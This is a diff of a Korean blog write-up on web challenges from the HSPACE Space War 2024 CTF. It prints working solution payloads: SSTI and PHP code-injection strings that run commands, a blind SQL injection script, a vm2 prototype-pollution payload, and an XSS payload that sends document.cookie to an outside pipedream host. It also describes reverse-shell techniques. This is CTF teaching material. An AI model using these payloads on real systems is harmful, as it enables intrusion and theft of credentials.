@@ -1,13 +1,14 @@
 ---
-title : "Space War 2024#1 (Web) write-up"
-author : "ipwn"
-tags : ["SpaceWar", "Webhacking"]
-description :
+title: "Space War 2024#1 (Web) write-up"
+author: "ipwn"
+tags: ["SpaceWar", "Webhacking"]
+description:
 categories: []
-date : 2024-04-05T02:17:33+09:00
+date: 2024-04-05T02:17:33+09:00
 ---
 
 ### 목차
+
 1. 스페이스 워(Space War)?
 2. for_beginner
 3. for_beginner-SQL
@@ -30,15 +31,15 @@ date : 2024-04-05T02:17:33+09:00
 
 ## 스페이스 워(Space War)?
 
-**스페이스 워(Space War)**\ 는 HSPACE에서 진행하는 정기 CTF입니다! 그러나 이미 HSPACE에 대해 잘 알고 계신 분들이라면 아시겠지만, 사실 HSPACE에서는 과거부터 CTF를 계속 개최해왔습니다. 파트너십을 맺은 대학 동아리들의 신청을 받아 해당 동아리들만을 위해 개최한 **Partner CTF**가 있었으나 해당 대회에서 여러 개편과정을 거쳐 지금의 스페이스 워가 탄생하였습니다.
+**스페이스 워(Space War)**는 HSPACE에서 진행하는 정기 CTF입니다! 그러나 이미 HSPACE에 대해 잘 알고 계신 분들이라면 아시겠지만, 사실 HSPACE에서는 과거부터 CTF를 계속 개최해왔습니다. 파트너십을 맺은 대학 동아리들의 신청을 받아 해당 동아리들만을 위해 개최한 **Partner CTF**가 있었으나 해당 대회에서 여러 개편과정을 거쳐 지금의 스페이스 워가 탄생하였습니다.
 
-그럼 여기서 Space War와 Partner CTF는 어떻게 다른지에 대해서 설명드리겠습니다. 
+그럼 여기서 Space War와 Partner CTF는 어떻게 다른지에 대해서 설명드리겠습니다.
 
 ### 1. 파트너 CTF
 
 우선 파트너 CTF입니다. 파트너 CTF는 앞서 이야기한 것처럼 HSPACE와 파트너십을 맺은 파트너 동아리들의 내부 인원이 도전할 수 있는 CTF 대회였습니다.<br>
 장점으로는 각 동아리들이 내부 대회가 필요할 때마다 신청을 통해 대회를 개최할 수 있었고, 요청 사항에 필요한 사항을 구체적으로 작성할 수 있었습니다. 때문에 파트너 동아리의 특수한 상황을 대부분 고려하여 반영할 수 있습니다.<br>
-그러나, 반대로 동일한 시간에 여러 파트너 동아리들이 CTF 진행을 요청하는 경우에는 동아리마다의 특수한 요구사항(특정 분야의 문제만 요청, 난이도 하향조정 요청 등)을 모두 반영할 수 없었고, 이 외에도 각 동아리마다 해결할 수 있는 문제의 난이도가 모두 천차만별이기에 문제 출제진들에게는 매우 까다롭다는 문제 등 다양한 단점 역시 존재했습니다. 
+그러나, 반대로 동일한 시간에 여러 파트너 동아리들이 CTF 진행을 요청하는 경우에는 동아리마다의 특수한 요구사항(특정 분야의 문제만 요청, 난이도 하향조정 요청 등)을 모두 반영할 수 없었고, 이 외에도 각 동아리마다 해결할 수 있는 문제의 난이도가 모두 천차만별이기에 문제 출제진들에게는 매우 까다롭다는 문제 등 다양한 단점 역시 존재했습니다.
 
 ### 2. 스페이스 워
 
@@ -78,13 +79,13 @@ def main():
     name = request.args.get("name", "World")
     return render_template_string(f'Hello {name}!!')
 ```
+
 name 파라미터로 데이터를 받은 뒤 render_template_string 함수를 이용해서 template rendering을 해주는 전형적인 ssti 문제다.
 필터링이 걸려있는데, 우리가 고려해야할 것은 단지 `[,]`를 쓰지 못한다는 것이다. 이러한 것은 |와 attr을 이용하여 pyjail 풀 듯이 os나 subprocess 모듈 찾아서 함수 실행해주면 된다.
 
 ```python
-{{< print `{{%27%27|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5fmro\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(1)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(494)(%27cat%20flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}` >}}
+{{%27%27|attr(%27\x5f\x5fclass\x5f\x5f%27)|attr(%27\x5f\x5fmro\x5f\x5f%27)|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(1)|attr(%27\x5f\x5fsubclasses\x5f\x5f%27)()|attr(%27\x5f\x5fgetitem\x5f\x5f%27)(494)(%27cat%20flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}
 ```
-
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
@@ -126,6 +127,7 @@ admin의 평문 password를 맞게 구하여 로그인하면 플래그를 얻을
 이때 sqli의 성공 여부를 확인할 수 없기 때문에 time based sqli를 해주면 된다.
 
 **exploit.py**
+
 ```py
 import requests
 import time
@@ -145,17 +147,17 @@ for i in range(1,33):
             pw+=j
             print(pw)
             break
-        else: 
+        else:
             pass
 ```
 
 위 exploit을 이용하면 아래의 password hash를 얻을 수 있다.
+
 ```
 ede6b50e7b5826fe48fc1f0fe772c48f
 ```
 
 이를 md5 rainbow table에서 검색해보면 1q2w3e4r5t6y라는 평문 값을 얻을 수 있고 이를 이용하여 로그인을 하면 플래그를 얻을 수 있다.
-
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
@@ -181,9 +183,9 @@ def check(path):
         return "Not Found", 200
     return "Not Found", 404
 ```
-경로로 입력되는 부분을 flag의 앞부분부터 비교하여 맞으면 200, 틀리면 404를 반환해준다. 
-정말 간단하기 때문에 대충 코드 짜서 status code가 200일 때를 기준으로 플래그를 뽑아주면 된다.
 
+경로로 입력되는 부분을 flag의 앞부분부터 비교하여 맞으면 200, 틀리면 404를 반환해준다.
+정말 간단하기 때문에 대충 코드 짜서 status code가 200일 때를 기준으로 플래그를 뽑아주면 된다.
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
@@ -197,12 +199,12 @@ def check(path):
 
 그냥 숨겨진 파일과 폴더를 하나씩 게싱해서 찾아나가면 된다.
 
-
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
 웹 상에서 서버를 배포할 때 개발자의 실수로 인해 지워지지 않은 민감 정보가 담긴 파일들이 유출되었을 때를 가정한 문제였습니다. 그 외에도 웹을 구성하는 기본 요소 파일들과 `admin`과 같이 한 번쯤 입력해봄직한(...) 디렉토리 및 파일들에 플래그의 조각들이 담겨있습니다.
 
 파일들의 리스트는 다음과 같습니다. (리스트의 넘버링은 플래그 조각의 순서와 상관없습니다.)
+
 1. git directory
 2. admin directory
 3. .index.php.swp
@@ -233,11 +235,11 @@ def check(path):
   //validate values
   $x = (float)($x);
   $y = (float)($y);
-  
+
   if(preg_match("/[^+\-*\/]/", $op)) {
     die("no hack");
   }
-  
+
   $message = addslashes($message);
   $user_answer = (float)($user_answer);
 
@@ -264,15 +266,16 @@ if (\$real_answer == $user_answer) {
 일단 x,y, user_answer 파라미터는 float으로 변환하는 코드로 인해 공격에 사용할 수 없다. 그럼 이제 우리가 사용할 수 있는건 message, op 파라미터인데 op 파라미터엔 preg_match를 이용한 filter가, message엔 addslashes가 있다.
 
 이는 php의 문법적 특징을 이용하면 우회하는 것이 가능하다.
+
 ```plaintext
-op : /* 
+op : /*
 
 message: */; system(<<<EOF
 ls
 EOF); ?>
 ```
-위와 같이 전달해줄 경우 주석으로 인해 message 파라미터에 포함된 내용이 php code로 인식될 것이고 addslashes에 관계없이 ls를 실행하는 것이 가능하다.
 
+위와 같이 전달해줄 경우 주석으로 인해 message 파라미터에 포함된 내용이 php code로 인식될 것이고 addslashes에 관계없이 ls를 실행하는 것이 가능하다.
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
@@ -287,47 +290,47 @@ EOF); ?>
 **출제자 책정 난이도**: Medium
 
 ```javascript
-	if(req.userUid == -1 || !req.userData)
-		return res.json({ error: true, msg: "Login first" })
+if (req.userUid == -1 || !req.userData)
+  return res.json({ error: true, msg: "Login first" });
 
-	if(parseInt(req.userUid) != 0)
-		return res.json({ error: true, msg: "You can't do this sorry" })
+if (parseInt(req.userUid) != 0)
+  return res.json({ error: true, msg: "You can't do this sorry" });
 
-	if(req.userData.length > 160)
-		return res.json({ error: true, msg: "Too long!!" })
+if (req.userData.length > 160)
+  return res.json({ error: true, msg: "Too long!!" });
 
-	if(checkoutTimes.has(req.ip) && checkoutTimes.get(req.ip)+1 > now()) {
-		return res.json({ error: true, msg: 'too fast'})
-	}
-	checkoutTimes.set(req.ip,now())
-	
-	let sbx = {
-		readFile: (path) => {
-			if(!(new String(path).toString()).includes('flag'))
-				return fs.readFileSync(path,{encoding: "utf-8"})
-			return null
-		},
-		sum: (args) => args.reduce((a,b)=>a+b),
-	}
+if (checkoutTimes.has(req.ip) && checkoutTimes.get(req.ip) + 1 > now()) {
+  return res.json({ error: true, msg: "too fast" });
+}
+checkoutTimes.set(req.ip, now());
 
-	let vm = new vm2.VM({
-		timeout: 20,
-	    sandbox: sbx,
-	    fixAsync: true,
-	    eval: false
-	})
+let sbx = {
+  readFile: (path) => {
+    if (!new String(path).toString().includes("flag"))
+      return fs.readFileSync(path, { encoding: "utf-8" });
+    return null;
+  },
+  sum: (args) => args.reduce((a, b) => a + b)
+};
 
-	let result = ":(";
-	try {
-		result = new String(vm.run(`sum([${req.userData}])`))
-	} catch (e) {}
-	res.type('text/plain').send(result)
+let vm = new vm2.VM({
+  timeout: 20,
+  sandbox: sbx,
+  fixAsync: true,
+  eval: false
+});
+
+let result = ":(";
+try {
+  result = new String(vm.run(`sum([${req.userData}])`));
+} catch (e) {}
+res.type("text/plain").send(result);
 ```
 
 uid가 0이여야 하는데 일반적으론 uid를 0으로 설정하는 것이 불가능하다.
 하지만 uid를 0.1e1과 같이 전달할 경우 type casting으로 인해 이를 우회하여 uid가 0인 유저가 될 수 있다.
 
-위를 우회했기 때문에 vm안에서 코드를 실행하는 것이 가능한데 filter로 인해서 flag 파일을 읽는 것이 불가능하다. 
+위를 우회했기 때문에 vm안에서 코드를 실행하는 것이 가능한데 filter로 인해서 flag 파일을 읽는 것이 불가능하다.
 이는 Prototype pollution을 이용하면 우회하여 flag 파일을 읽는 것이 가능하다.
 
 ```
@@ -341,12 +344,14 @@ prototpe pollution을 이용해서 fs.readFileSync가 전혀 다른 파일을 �
 ```
 {"username":"ff","password":"123456"}
 ```
--> 
+
+->
+
 ```
 uid=0.3e1; passwd=8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92; data=1+1])%3ba={}%3ba.__proto__.protocol='file:'%3ba.__proto__.pathname='/flag.txt'%3ba.__proto__.href='asdf'%3ba.__proto__.origin='a'%3ba.__proto__.hostname=''%3breadFile([])//
 ```
-여기서 uid 0.3e1에서 3은 자신이 부여받은 uid를 넣어주면 된다.
 
+여기서 uid 0.3e1에서 3은 자신이 부여받은 uid를 넣어주면 된다.
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
@@ -381,40 +386,47 @@ def index():
 ```
 
 매우 간단한 구성을 가진 코드다. xss를 해야하는데 csp가 걸려있다.
+
 ```default-src 'self'; base-uri 'none'; script-src 'nonce-~~'
     'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
 ```
+
 굉장히 튼튼해보이며, template이 들어가는 곳엔
+
 ```
 {{ note | safe }}
 ```
+
 sanitize 없이 우리의 Input이 출력된다.
-Injection이 가능한 point는 2곳이 있는데 
+Injection이 가능한 point는 2곳이 있는데
+
 ```html
 <script nonce="{{ nonce }}">
-        const debug = () => {
-            const name = "{{ name | safe }}";
-            const code = "{{ code | safe }}";
-            console.log(`${name} : execute debug mode`)
-            eval(code);
-        }
-        if ({{ is_admin }}) {
-            debug();
-        }
-    </script>
+  const debug = () => {
+      const name = "{{ name | safe }}";
+      const code = "{{ code | safe }}";
+      console.log(`${name} : execute debug mode`)
+      eval(code);
+  }
+  if ({{ is_admin }}) {
+      debug();
+  }
+</script>
 ```
+
 첫 번째는 맨 먼저 나오는 스크립트 태그,
 두 번째는 마지막 스크립트 태그에 있다.
 이때 name, code 파라미터엔 `(,),{,}`가 필터링되었기 때문에 quote를 탈출해도 임의의 함수 실행이 불가능하다.
-2번째 인젝션 포인트에선 `(,),{,}`를 사용할 수 있지만 json 형태로 변형되며 backslash가 붙기 때문에 quote를 탈출할 수 없다. 
+2번째 인젝션 포인트에선 `(,),{,}`를 사용할 수 있지만 json 형태로 변형되며 backslash가 붙기 때문에 quote를 탈출할 수 없다.
 이를 익스플로잇하기 위해선 nonce bypass를 위해 script 태그의 탈출 없이 이미 정의된 script tag 내에서 함수를 실행해야한다.
 여기서 대충 html 스펙을 이용한 트릭을 사용해주면 된다.
 
 ```
 <!--<script//*
 ```
+
 위의 코드를 name이나 code 파라미터에 넣을 경우 script data double escape state라는 쌈뽕한 것을 사용할 수 있다.
-이는 html parser가 파싱할 때 각 태그를 토큰화하여 분석하기 때문인데 
+이는 html parser가 파싱할 때 각 태그를 토큰화하여 분석하기 때문인데
 https://html.spec.whatwg.org/multipage/parsing.html#script-data-double-escape-start-state
 이걸 읽어보자.
 
@@ -423,7 +435,6 @@ https://html.spec.whatwg.org/multipage/parsing.html#script-data-double-escape-st
 ```
 http://server:8188/report?url=http://web:8080/?title=adsf%26name=<!--<script//*%26content=<img src=%27*/};location.replace(`https://enllwt2ugqrt.x.pipedream.net/${document.cookie}`);console.log({//</script><!--
 ```
-
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
@@ -441,10 +452,9 @@ http://server:8188/report?url=http://web:8080/?title=adsf%26name=<!--<script//*%
 const { openDelimiter } = require("ejs");
 const express = require("express");
 const fs = require("fs");
-const ejs = require("ejs")
+const ejs = require("ejs");
 
 const app = express();
-
 
 const template = `<!DOCTYPE html>
 <html>
@@ -455,13 +465,13 @@ const template = `<!DOCTYPE html>
     Content:
     PAGE
 </body>
-</html>`
+</html>`;
 
 app.get("/", (req, res) => {
-    const page = req.query.page || '1';
-    let data = fs.readFileSync(`./page/${page}`).toString();
-    let render_data = ejs.render(template.replace("PAGE", data));
-    res.send(render_data);
+  const page = req.query.page || "1";
+  let data = fs.readFileSync(`./page/${page}`).toString();
+  let render_data = ejs.render(template.replace("PAGE", data));
+  res.send(render_data);
 });
 
 app.listen(8080, () => {
@@ -470,11 +480,13 @@ app.listen(8080, () => {
 ```
 
 page 파라미터로 값을 전달받은 뒤 fs.readFileSync 함수로 해당 내용을 읽어온 뒤 template과 함께 ejs template 렌더링을 해준다.
-여기서 path traversal이 되는데 flag파일에 권한이 없기 때문에 쉘을 따야한다. 
+여기서 path traversal이 되는데 flag파일에 권한이 없기 때문에 쉘을 따야한다.
 하지만 node를 실행하는 부분의 인자를 확인해보면 다음과 같은 내용을 확인할 수 있다.
+
 ```
-node --experimental-permission --allow-fs-read=/* --allow-fs-write=/* /app/app.js 
+node --experimental-permission --allow-fs-read=/* --allow-fs-write=/* /app/app.js
 ```
+
 실험 기능을 통해서 파일 read와 write만 허용해놔서 child_process 같은 모듈을 이용한 rce가 불가능하다.
 
 그럼 좀 다른 방법을 이용해서 쉘을 획득해야하는데 해당 문제에서 nginx를 사용하는 것, path traversal을 이용하여 임의의 파일을 읽을 수 있는 것을 이용하면 원하는 template를 렌더링시킬 수 있고 이때 임의의 함수 실행을 통해 쉘을 획득하는 것이 가능하다.
@@ -483,13 +495,14 @@ nginx에서 특정 크기 이상의 body data는 임시 파일 형태로 잠시 
 쉘은 쉘코드를 이용하여 획득하면 되는데 임의의 파일 쓰기, 읽기가 되기 때문에 /proc/self/mem을 열어서 맞는 offset에 쉘코드를 작성하면 쉘을 획득할 수 있다.
 
 exploit 폴더에 있는 ex.py를 실행하면 exploit.js를 서버에 업로드해주는데
-이때 
+이때
+
 ```
 http://server/?page=../../../../proc/{nginx_pid}/fd/{random_fd}
 ```
+
 로 접근해보면 특정 fd 값에서 업로드되고 있는 exploit.js의 내용이 Include되는 것을 확인할 수 있다.
 그럼 이제 쉘코드를 수정해서 내 서버로 리버스쉘을 연결하도록 하고 다시 공격을 진행하면 특정 offset에서 쉘을 획득할 수 있다(서버 환경마다 좀 바뀌므로 여러 번의 시도가 필요하다)
-
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
@@ -513,11 +526,11 @@ const merge = (obj1, obj2) => {
     if (typeof obj1[key] !== "undefined" && typeof val === "object") {
       obj1[key] = merge(obj1[key], val);
     } else {
-        if (typeof val == "string" && val.startsWith("Function")) {
-            obj1[key] = Function(val.slice(8));
-        } else {
-            obj1[key] = val;
-        }
+      if (typeof val == "string" && val.startsWith("Function")) {
+        obj1[key] = Function(val.slice(8));
+      } else {
+        obj1[key] = val;
+      }
     }
   }
   return obj1;
@@ -530,17 +543,20 @@ prototype pollution이 터진다. 그런데 trim 함수로 인해서 공백을 �
 하지만 코드 어디를 찾아봐도 함수를 실행해주는 기능은 없다. 이는 간단한 트릭을 이용하면된다.
 
 ```javascript
-var json = replacer || spaces
+var json =
+  replacer || spaces
     ? JSON.stringify(value, replacer, spaces)
     : JSON.stringify(value);
 ```
 
 express.js의 res.json 함수 내에서 사용하는 stringify 함수의 일부다. 따로 구현을 한 것이 아닌, JSON.stringify 함수를 이용하고 있다.
 아래의 코드를 보자.
+
 ```
 JSON.stringify({"toJSON":Function(`console.log("pwned");`)});
 ```
-이 코드를 실행하면 우린 
+
+이 코드를 실행하면 우린
 pwned가 출력되는 것을 확인할 수 있다. 이 기능을 이용하면 따로 실행해주는 로직이 없더라도 단순히 stringify 함수를 통해서 쉘을 획득할 수 있게된다.
 
 아무튼 이를 이용하여 쉘을 획득해주면 된다.
@@ -548,7 +564,7 @@ pwned가 출력되는 것을 확인할 수 있다. 이 기능을 이용하면 �
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
 문제에 적혀있는 설명처럼 `merge`함수 내에서는 안전하지 않은 키워드들을 필터링하는 구문을 잘 삽입해놓고, 그 이후에 `trim` 함수를 호출하는 실수를 범하여 `prototype pollution`을 발생시킬 수 있는 취약점과, `JSON.stringify`를 통한 function call이 가능한 두 가지 취약점을 엮어야 하는 문제였습니다. <br>
-내가 아는 코드의 구현 스펙 자체를 이해하고 문제에 접근하는 것이 중요하다는 점을 알 수 있습니다. 단순히 코드상에서는 취약점이 전혀 없어 보여도 내부 구현 스펙상의 문제로 인해 취약점이 발생하는 경우는 웹해킹이 아니라도 잦은 경우입니다. 때문에 개발자가 작성한 코드 상에서의 취약점이 없는 것 같다면 내부 구현 코드를 살펴보는 것도 좋은 방안이라는 걸 배울 수 있는 문제였습니다. 
+내가 아는 코드의 구현 스펙 자체를 이해하고 문제에 접근하는 것이 중요하다는 점을 알 수 있습니다. 단순히 코드상에서는 취약점이 전혀 없어 보여도 내부 구현 스펙상의 문제로 인해 취약점이 발생하는 경우는 웹해킹이 아니라도 잦은 경우입니다. 때문에 개발자가 작성한 코드 상에서의 취약점이 없는 것 같다면 내부 구현 코드를 살펴보는 것도 좋은 방안이라는 걸 배울 수 있는 문제였습니다.
 
 ---
 
@@ -560,7 +576,8 @@ php filter를 이용한 rce다.
 
 https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
 
-이걸 이용하되, 
+이걸 이용하되,
+
 ```php
 if($page[0] === '/' || preg_match("/^.*(\\.\\.|php).*$/i", $page)) {
     die("no hack");
@@ -568,14 +585,15 @@ if($page[0] === '/' || preg_match("/^.*(\\.\\.|php).*$/i", $page)) {
 ```
 
 이 필터를 우회해야한다.
-이는 
+이는
+
 ```php
 ini_set('pcre.backtrack_limit', 1000);
 ```
+
 이 설정으로 인해 backtrack_limit에 도달했을 때 preg_match에서 false가 반환되는 것을 이용하여 filter를 우회하고 임의의 파일을 include하여 익스해주면 된다.
 
 이는 ./를 여러 개 넣는 것으로 트리거가 가능하다.
-
 
 ### 블로그 포스트 작성자의 추가적인 코멘트
 
